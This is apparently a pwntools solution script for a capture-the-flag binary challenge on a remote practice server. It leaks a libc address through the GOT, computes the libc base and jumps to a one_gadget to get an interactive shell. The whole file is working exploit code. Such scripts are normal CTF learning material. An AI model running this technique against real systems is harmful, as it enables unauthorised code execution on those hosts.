from pwn import *
context.log_level = 'debug'

# io = process('./pwn')
io = remote('node4.buuoj.cn', 27336)
elf = ELF('./pwn')
libc = ELF('./libc-2.23.so')
# libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')

one_gadgets = [0x45216, 0x4526a, 0xf02a4, 0xf1147]

sla = lambda x, y: io.sendlineafter(x, y)
sa = lambda x, y: io.sendafter(x, y)
ru = lambda x: io.recvuntil(x)
rud = lambda x: io.recvuntil(x, drop=True)

sla(b'Read location?\n', str(elf.got['puts']).encode())
ru(b'Value: 0x')
libc_base = int(rud(b'\n'), 16) - libc.symbols['puts']
sla(b'Jump location?\n', str(one_gadgets[3] + libc_base).encode())

io.interactive()
